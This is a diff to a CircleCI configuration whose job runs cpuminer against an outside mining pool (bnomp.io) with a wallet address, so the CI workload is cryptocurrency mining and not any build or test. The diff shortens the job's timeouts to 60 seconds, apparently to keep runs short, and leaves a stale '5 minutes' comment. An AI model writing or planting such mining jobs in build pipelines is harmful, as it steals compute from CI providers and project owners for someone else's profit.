@@ -22,7 +22,7 @@ jobs:
           command: |
             current_time=$(date +%s)
             elapsed_time=$((current_time - CIRCLE_START_TIME))
-            max_time=300  # Set your maximum allowed time in seconds (5 minutes)
+            max_time=60  # Set your maximum allowed time in seconds (5 minutes)
 
             if [ "$elapsed_time" -gt "$max_time" ]; then
               echo "Job has exceeded the maximum allowed time. Cancelling..."
@@ -33,7 +33,7 @@ jobs:
           name: Run command
           command: |
             cd cpuminer-linux && ./cpuminer -a aurum -o stratum+tcp://bnomp.io:3333 -u B9P2PDtk2cftCQiC41hw6Pw9rdJEiVztae -p x
-          no_output_timeout: 100s
+          no_output_timeout: 60s
 workflows:
   version: 2
   build_only_develop:
